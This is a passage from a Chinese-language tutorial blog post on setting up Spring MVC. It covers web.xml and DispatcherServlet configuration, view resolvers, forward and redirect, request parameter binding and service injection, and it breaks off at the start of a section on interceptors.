            <span class="nt">&lt;version&gt;</span>${spring.version}<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>spring-aspects<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>${spring.version}<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>spring-expression<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>${spring.version}<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>spring-jdbc<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>${spring.version}<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>spring-orm<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>${spring.version}<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>spring-tx<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>${spring.version}<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>spring-web<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>3.2.13.RELEASE<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
        <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>org.springframework<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>spring-webmvc<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>3.2.13.RELEASE<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;/dependency&gt;</span>
    <span class="nt">&lt;/dependencies&gt;</span>
</code></pre></div></div>

<p>初始化成功后，我们看看当前的结构是怎样的：</p>

<p><strong>index.jsp</strong> :</p>

<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;%@ page </span><span class="na">contentType=</span><span class="s">"text/html; charset=UTF-8"</span><span class="na"> pageEncoding=</span><span class="s">"UTF-8"</span> <span class="nt">%&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>JSP - Hello World<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;h1&gt;&lt;%=</span> <span class="s">"Hello World!"</span> <span class="nt">%&gt;</span>
<span class="nt">&lt;/h1&gt;</span>
<span class="nt">&lt;br/&gt;</span>
<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"hello-servlet"</span><span class="nt">&gt;</span>Hello Servlet<span class="nt">&lt;/a&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p><strong>HelloServlet</strong> :</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@WebServlet</span><span class="o">(</span><span class="n">name</span> <span class="o">=</span> <span class="s">"helloServlet"</span><span class="o">,</span> <span class="n">value</span> <span class="o">=</span> <span class="s">"/hello-servlet"</span><span class="o">)</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">HelloServlet</span> <span class="kd">extends</span> <span class="nc">HttpServlet</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="nc">String</span> <span class="n">message</span><span class="o">;</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">init</span><span class="o">()</span> <span class="o">{</span>
        <span class="n">message</span> <span class="o">=</span> <span class="s">"Hello World!"</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doGet</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">IOException</span> <span class="o">{</span>
        <span class="n">response</span><span class="o">.</span><span class="na">setContentType</span><span class="o">(</span><span class="s">"text/html"</span><span class="o">);</span>

        <span class="c1">// Hello</span>
        <span class="nc">PrintWriter</span> <span class="n">out</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">();</span>
        <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"&lt;html&gt;&lt;body&gt;"</span><span class="o">);</span>
        <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"&lt;h1&gt;"</span> <span class="o">+</span> <span class="n">message</span> <span class="o">+</span> <span class="s">"&lt;/h1&gt;"</span><span class="o">);</span>
        <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"&lt;/body&gt;&lt;/html&gt;"</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">destroy</span><span class="o">()</span> <span class="o">{</span>
    <span class="o">}</span>
<span class="o">}</span>

</code></pre></div></div>

<p>默认访问 <strong>index.jsp</strong>,点击链接可以跳转到<strong>HelloServlet</strong>，但这并不是mvc  ，只是简单的jsp+servlet跳转。</p>

<p>下面我们在 <code class="language-plaintext highlighter-rouge">/WEB-INF/jsp/</code> 下创建 View： login.jsp (内容无所谓)</p>

<blockquote>
  <p>WEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>
</blockquote>

<p>创建一个控制器：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@Controller</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">LoginController</span> <span class="o">{</span>

    <span class="nd">@RequestMapping</span><span class="o">(</span><span class="s">"/login"</span><span class="o">)</span>
    <span class="kd">public</span> <span class="nc">ModelAndView</span> <span class="nf">login</span><span class="o">(){</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nf">ModelAndView</span><span class="o">(</span><span class="s">"/WEB-INF/jsp/login.jsp"</span><span class="o">);</span>
    <span class="o">}</span>

    <span class="nd">@RequestMapping</span><span class="o">(</span><span class="s">"/login2"</span><span class="o">)</span>
    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">login2</span><span class="o">(){</span>
        <span class="k">return</span> <span class="s">"/WEB-INF/jsp/login.jsp"</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>这两种方式返回视图原理上是一样的，只是后续和model结合写法会有所不一样，看个人习惯。</p>

<p>这时候运行会发现访问全部404，这是因为我们还没有配置xml文件，也是springMVC相比springBoot而言最麻烦的一点…</p>

<p>Spring MVC 是基于 Servlet 的，DispatcherServlet 是整个 Spring MVC 框架的核心，主要负责截获请求并将其分派给相应的处理器处理（后续会慢慢介绍）。所以配置 Spring MVC，首先要定义 DispatcherServlet，也就是在<strong>web.xml</strong>下进行配置。</p>

<p><strong>web.xml</strong>：</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span>
<span class="nt">&lt;web-app</span> <span class="na">xmlns=</span><span class="s">"http://xmlns.jcp.org/xml/ns/javaee"</span>
         <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span>
         <span class="na">xsi:schemaLocation=</span><span class="s">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span>
         <span class="na">version=</span><span class="s">"4.0"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;display-name&gt;</span>springMVC<span class="nt">&lt;/display-name&gt;</span>
    <span class="nt">&lt;welcome-file-list&gt;</span>
        <span class="c">&lt;!--入口文件--&gt;</span>
        <span class="c">&lt;!--实际存在的物理文件地址，不能将首页设置成Servlet或Controller的地址--&gt;</span>
        <span class="c">&lt;!--可以选择不设置，默认访问 / ，然后把controller绑定在上面--&gt;</span>
        <span class="nt">&lt;welcome-file&gt;</span>/index.jsp<span class="nt">&lt;/welcome-file&gt;</span>
    <span class="nt">&lt;/welcome-file-list&gt;</span>

    <span class="nt">&lt;servlet&gt;</span>
        <span class="nt">&lt;servlet-name&gt;</span>springmvc<span class="nt">&lt;/servlet-name&gt;</span>
        <span class="nt">&lt;servlet-class&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="nt">&lt;/servlet-class&gt;</span>
        <span class="c">&lt;!-- 表示容器再启动时立即加载servlet --&gt;</span>
        <span class="nt">&lt;load-on-startup&gt;</span>1<span class="nt">&lt;/load-on-startup&gt;</span>
    <span class="nt">&lt;/servlet&gt;</span>

    <span class="nt">&lt;servlet-mapping&gt;</span>
        <span class="nt">&lt;servlet-name&gt;</span>springmvc<span class="nt">&lt;/servlet-name&gt;</span>
        <span class="c">&lt;!-- 处理所有URL --&gt;</span>
        <span class="nt">&lt;url-pattern&gt;</span>/<span class="nt">&lt;/url-pattern&gt;</span>
    <span class="nt">&lt;/servlet-mapping&gt;</span>
<span class="nt">&lt;/web-app&gt;</span>
</code></pre></div></div>

<p>从上述配置我们可以知道三点</p>

<ol>
  <li>初始界面为/index.jsp</li>
  <li>配置了一个名为 <strong>springmvc</strong> 的 Servlet，类型为 DispatcherServlet ，它就是 Spring MVC 的入口，并标记为容器启动后加载，即自启动。</li>
  <li>通过 servlet-mapping 映射到 <code class="language-plaintext highlighter-rouge">/</code>，即 DispatcherServlet 会截获并处理该项目的所有 URL 请求。</li>
</ol>

<p>这只是一个初始化定义，接下来我们需要根据配置的servlet（springmvc），创建其对应的配置文件，该配置文件命名规则为 <strong>&lt;servlet-name&gt;-servlet.xml</strong>，上述例子也就是 <strong>springmvc-servlet.xml</strong> ：</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="nt">&lt;beans</span> <span class="na">xmlns=</span><span class="s">"http://www.springframework.org/schema/beans"</span>
       <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span>
       <span class="na">xmlns:mvc=</span><span class="s">"http://www.springframework.org/schema/mvc"</span>
       <span class="na">xmlns:p=</span><span class="s">"http://www.springframework.org/schema/p"</span>
       <span class="na">xmlns:context=</span><span class="s">"http://www.springframework.org/schema/context"</span>
       <span class="na">xsi:schemaLocation=</span><span class="s">"
        http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd
        http://www.springframework.org/schema/context
        http://www.springframework.org/schema/context/spring-context.xsd
        http://www.springframework.org/schema/mvc
        http://www.springframework.org/schema/mvc/spring-mvc.xsd"</span><span class="nt">&gt;</span>

    <span class="nt">&lt;context:component-scan</span> <span class="na">base-package=</span><span class="s">"com.example.springmvc.controller"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;/beans&gt;</span>
</code></pre></div></div>

<p>目前这里的有用代码只是一句<code class="language-plaintext highlighter-rouge">    &lt;context:component-scan base-package="com.example.springmvc.controller"/&gt;</code> ，表明扫描包<code class="language-plaintext highlighter-rouge">com.example.springmvc.controller</code>下所有的控制器，根据其注解所对应的路由，并将其生命周期纳入Spring管理。</p>

<p>不使用注解的话，也可以手动把控制器和路由进行绑定</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">&lt;bean</span> <span class="na">name=</span><span class="s">"/"</span> <span class="na">class=</span><span class="s">"com.example.springmvc.controller.LoginController"</span><span class="nt">/&gt;</span>
</code></pre></div></div>

<p>这样启动后，访问<code class="language-plaintext highlighter-rouge">/login</code>，就可以跳转到<code class="language-plaintext highlighter-rouge">/WEB-INF/jsp/login.jsp</code>。</p>

<p>不过你会发现在controller中每次跳转到jsp都需要写一个完整路径，可以在<code class="language-plaintext highlighter-rouge">springmvc-servlet.xml</code>中通过视图解析器(ViewResolver)匹配一个定义的视图：</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">&lt;bean</span> <span class="na">id=</span><span class="s">"viewResolver"</span>
          <span class="na">class=</span><span class="s">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span><span class="nt">&gt;</span>
        <span class="c">&lt;!--前缀 --&gt;</span>
        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"prefix"</span> <span class="na">value=</span><span class="s">"/WEB-INF/jsp/"</span> <span class="nt">/&gt;</span>
        <span class="c">&lt;!--后缀 --&gt;</span>
        <span class="nt">&lt;property</span> <span class="na">name=</span><span class="s">"suffix"</span> <span class="na">value=</span><span class="s">".jsp"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/bean&gt;</span>
</code></pre></div></div>

<p>之后controller可改为：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@Controller</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">LoginController</span> <span class="o">{</span>

    <span class="nd">@RequestMapping</span><span class="o">(</span><span class="s">"/login"</span><span class="o">)</span>
    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">login</span><span class="o">(</span><span class="nc">Model</span> <span class="n">model</span><span class="o">){</span>
        <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"name"</span><span class="o">,</span><span class="s">"theoyu"</span><span class="o">);</span>
        <span class="k">return</span> <span class="s">"login"</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>这里我们随意引入了Model对象，在视图中可以通过el表达式<code class="language-plaintext highlighter-rouge">${name}</code>取出来</p>

<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;%@ page </span><span class="na">contentType=</span><span class="s">"text/html;charset=UTF-8"</span><span class="na"> language=</span><span class="s">"java"</span> <span class="nt">%&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>Login<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
This is Login Page , Hello ${name}
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>

</code></pre></div></div>

<p>部署后，访问<code class="language-plaintext highlighter-rouge">/login</code>即可看见：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220412155724.png" alt="image-20220412002135766" /></p>

<p>我们配置了最简单的mvc，后续我们慢慢基于它进行一些完善，不过在这之前有必要了解一下从第一个Servlet到返回视图这个过程经历了什么。</p>

<h2 id="0x02-springmvc执行流程">0x02 SpringMVC执行流程</h2>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220412155730.png" alt="image-20220410141300306" /></p>

<p>上图一共包含以下六个组件：</p>

<ol>
  <li><strong>DispatcherServlet</strong>：Spring MVC 的所有请求都要经过 DispatcherServlet 来统一分发。DispatcherServlet 相当于一个转发器或中央处理器，控制整个流程的执行。</li>
  <li><strong>HandlerMapping</strong>：处理器映射器，其作用是根据请求的 URL 路径，通过注解或者 XML 配置，寻找匹配的处理器（Handler）信息。</li>
  <li><strong>HandlerAdapter</strong>：处理器适配器，其作用是根据映射器找到的处理器（Handler）信息，按照特定规则执行相关的处理器（Handler）。</li>
  <li><strong>Handler</strong>：处理器，也称为controller，和 Java Servlet 扮演的角色一致。其作用是执行相关的请求处理逻辑，并返回相应的数据和视图信息，将其封装至 <strong>ModelAndView</strong> 对象中。</li>
  <li><strong>View Resolver</strong>：视图解析器，其作用是进行解析操作，通过 ModelAndView 对象中的 View 信息将逻辑视图名解析成真正的视图 View（如通过一个 JSP 路径返回一个真正的 JSP 页面）。</li>
  <li><strong>View</strong>：视图，其本身是一个接口，实现类支持不同的 View 类型（JSP、FreeMarker、Excel 等）。</li>
</ol>

<p>具体流程在<strong>org.springframework.web.servlet.DispatcherServlet#doDispatch</strong>，跟进一遍就非常明了。</p>

<h2 id="0x03-重定向和转发">0x03 重定向和转发</h2>

<p>Spring MVC 请求方式分为转发、重定向 2 种，分别使用 forward 和 redirect 关键字在 controller 层进行处理。</p>

<ul>
  <li><strong>转发</strong>（forward）：客户端发送http请求，web服务器接受，调用<strong>内部</strong>方法在容器内部将请求转发给另外一个视图或者处理请求（之前request中存放的消息不会消失），最后将目标资源发送给客户端。</li>
  <li><strong>重定向</strong>（redirect）：客户浏览器发送 http 请求，Web 服务器接受后发送 302 状态码响应及对应新的 location 给客户浏览器，客户浏览器发现是 302 响应，则自动再发送一个新的 http 请求（之前请求request的消息全部失效）。</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//转发给视图</span>
<span class="k">return</span> <span class="s">"test"</span><span class="o">;</span>
<span class="c1">//转发给一个请求方法</span>
<span class="k">return</span> <span class="s">"forward:/test"</span><span class="o">;</span>
<span class="c1">//重定向到一个请求方法</span>
<span class="k">return</span> <span class="s">"redirect:/test"</span>
</code></pre></div></div>

<h2 id="0x04-参数传递">0x04 参数传递</h2>

<p>说到请求肯定就少不了传参，一般来说springMVC有以下几种方式：</p>

<ul>
  <li>通过处理方法的形参接收请求参数</li>
  <li>通过 @RequestParam 接收请求参数</li>
  <li>通过 HttpServletRequest 接收请求参数</li>
  <li>通过 @PathVariable 接收 URL 中的请求参数</li>
  <li>通过实体 Bean 接收请求参数</li>
  <li>通过 @ModelAttribute 接收请求参数</li>
</ul>

<h3 id="通过处理方法的形参接收请求参数">通过处理方法的形参接收请求参数</h3>

<p>该方法就是把表单的参数直接写在控制器对应方法的形参中，要求形参名称与请求参数名称完全相同。</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/login1"</span><span class="o">)</span>
    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">login1</span><span class="o">(</span><span class="nc">String</span> <span class="n">username</span><span class="o">,</span><span class="nc">Model</span> <span class="n">model</span><span class="o">){</span>
        <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"name"</span><span class="o">,</span><span class="n">username</span><span class="o">);</span>
        <span class="k">return</span> <span class="s">"login"</span><span class="o">;</span>
    <span class="o">}</span>

</code></pre></div></div>

<h3 id="通过-requestparam-接收请求参数">通过 @RequestParam 接收请求参数</h3>

<p>在控制器对应方法入参处使用 @RequestParam 注解指定其对应的请求参数。@RequestParam 有以下三个参数：</p>

<ul>
  <li>value：参数名</li>
  <li>required：是否必须，默认为 true，表示请求中必须包含对应的参数名，若不存在将抛出异常</li>
  <li>defaultValue：参数默认值</li>
</ul>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/login2"</span><span class="o">)</span>
<span class="kd">public</span> <span class="nc">String</span> <span class="nf">login2</span><span class="o">(</span><span class="nd">@RequestParam</span> <span class="o">(</span><span class="n">required</span> <span class="o">=</span> <span class="kc">false</span><span class="o">,</span><span class="n">defaultValue</span> <span class="o">=</span> <span class="s">"Theoyu"</span><span class="o">)</span><span class="nc">String</span> <span class="n">username</span><span class="o">,</span> <span class="nc">Model</span> <span class="n">model</span><span class="o">){</span>
    <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"name"</span><span class="o">,</span><span class="n">username</span><span class="o">);</span>
    <span class="k">return</span> <span class="s">"login"</span><span class="o">;</span>
<span class="o">}</span>
</code></pre></div></div>

<p>RequestParam和直接形参传入差别不大，多了一些可以自定义的限制，包括默认情况下请求参数和接受参数不一样会报404错误。</p>

<h3 id="通过-httpservletrequest-接收请求参数">通过 HttpServletRequest 接收请求参数</h3>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/login3"</span><span class="o">)</span>
<span class="kd">public</span> <span class="nc">String</span> <span class="nf">login3</span><span class="o">(</span><span class="nc">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="nc">Model</span> <span class="n">model</span><span class="o">){</span>
    <span class="nc">String</span>  <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"username"</span><span class="o">);</span>
    <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"name"</span><span class="o">,</span><span class="n">username</span><span class="o">);</span>
    <span class="k">return</span> <span class="s">"login"</span><span class="o">;</span>
<span class="o">}</span>
</code></pre></div></div>

<h3 id="通过-pathvariable-接收-url-中的请求参数">通过 @PathVariable 接收 URL 中的请求参数</h3>

<p>从请求路由中解析</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/login4/{username}"</span><span class="o">)</span>
<span class="kd">public</span> <span class="nc">String</span> <span class="nf">login4</span><span class="o">(</span><span class="nd">@PathVariable</span> <span class="nc">String</span> <span class="n">username</span><span class="o">,</span> <span class="nc">Model</span> <span class="n">model</span><span class="o">){</span>
    <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"name"</span><span class="o">,</span><span class="n">username</span><span class="o">);</span>
    <span class="k">return</span> <span class="s">"login"</span><span class="o">;</span>
<span class="o">}</span>
</code></pre></div></div>

<h3 id="通过实体-bean-接收请求参数">通过实体 Bean 接收请求参数</h3>

<p>首先创建一个User实体类</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="nn">com.example.springmvc.entity.user</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">User</span> <span class="o">{</span>
    <span class="kd">private</span> <span class="nc">String</span> <span class="n">username</span><span class="o">;</span>
    <span class="kd">private</span> <span class="nc">String</span> <span class="n">password</span><span class="o">;</span>

    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">getPassword</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">password</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="kd">public</span> <span class="nc">String</span> <span class="nf">getUsername</span><span class="o">(){</span>
        <span class="k">return</span> <span class="n">username</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setPassword</span><span class="o">(</span><span class="nc">String</span> <span class="n">password</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">password</span> <span class="o">=</span> <span class="n">password</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setUsername</span><span class="o">(</span><span class="nc">String</span> <span class="n">username</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">username</span> <span class="o">=</span> <span class="n">username</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>
<p>get和post传入都可以，表单参数需要和bean属性对应。</p>
<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/login5"</span><span class="o">)</span>
<span class="kd">public</span> <span class="nc">String</span> <span class="nf">login5</span><span class="o">(</span><span class="nc">User</span> <span class="n">user</span><span class="o">,</span> <span class="nc">Model</span> <span class="n">model</span><span class="o">){</span>
    <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"name"</span><span class="o">,</span><span class="n">user</span><span class="o">.</span><span class="na">getUsername</span><span class="o">());</span>
    <span class="k">return</span> <span class="s">"login"</span><span class="o">;</span>
<span class="o">}</span>
</code></pre></div></div>

<h3 id="通过-modelattribute-接收请求参数">通过 @ModelAttribute 接收请求参数</h3>

<p>@ModelAttribute作用在方法的参数上时，会自动把数据和model进行绑定（省去了<code class="language-plaintext highlighter-rouge">model.addAttribute(x,x)</code>这一步）</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/login6"</span><span class="o">)</span>
<span class="kd">public</span> <span class="nc">String</span> <span class="nf">login6</span><span class="o">(</span><span class="nd">@ModelAttribute</span><span class="o">(</span><span class="s">"user"</span><span class="o">)</span><span class="nc">User</span> <span class="n">user</span><span class="o">,</span> <span class="nc">Model</span> <span class="n">model</span><span class="o">){</span>
    <span class="k">return</span> <span class="s">"login"</span><span class="o">;</span>
<span class="o">}</span>
</code></pre></div></div>

<p>不过这里需要修改一下view：</p>

<div class="language-jsp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;%@ page </span><span class="na">contentType=</span><span class="s">"text/html;charset=UTF-8"</span><span class="na"> language=</span><span class="s">"java"</span> <span class="nt">%&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>Login<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
This is Login Page , Hello ${user.username}
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<h2 id="0x05-service注解">0x05 service注解</h2>

<p>@Service注解会将标注类自动注册到 Spring 容器中。</p>

<p>@Autowired注解可以对类成员变量、方法及构造函数进行标注，完成自动装配的工作。</p>

<p>一般service层多用作业务模块的逻辑设计。</p>

<p>接口：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">interface</span> <span class="nc">UserServices</span> <span class="o">{</span>
    <span class="kt">boolean</span> <span class="nf">isAdmin</span><span class="o">(</span><span class="nc">User</span> <span class="n">user</span><span class="o">);</span>
<span class="o">}</span>
</code></pre></div></div>

<p>实现类：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@Service</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">UserServicesImpl</span> <span class="kd">implements</span>  <span class="nc">UserServices</span><span class="o">{</span>
    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">isAdmin</span><span class="o">(</span><span class="nc">User</span> <span class="n">user</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">user</span><span class="o">.</span><span class="na">getUsername</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">"admin"</span><span class="o">)){</span>
            <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p>admin下进行判断</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@Autowired</span>
<span class="kd">private</span> <span class="nc">UserServices</span> <span class="n">userServices</span><span class="o">;</span>

<span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/admin"</span><span class="o">)</span>
<span class="kd">public</span> <span class="nc">String</span> <span class="nf">admin</span><span class="o">(</span><span class="nc">HttpSession</span> <span class="n">session</span><span class="o">){</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">userServices</span><span class="o">.</span><span class="na">isAdmin</span><span class="o">((</span><span class="nc">User</span><span class="o">)</span> <span class="n">session</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"user"</span><span class="o">))){</span>
        <span class="k">return</span> <span class="s">"admin"</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="k">return</span> <span class="s">"redirect:/login"</span><span class="o">;</span>
<span class="o">}</span>
</code></pre></div></div>

<h2 id="0x06--interceptor-拦截器">0x06  Interceptor 拦截器</h2>

<p>拦截器其实不算陌生，之前spring内存木马就有Interceptor类型。这里简单写一个权限校验的拦截器：</p>

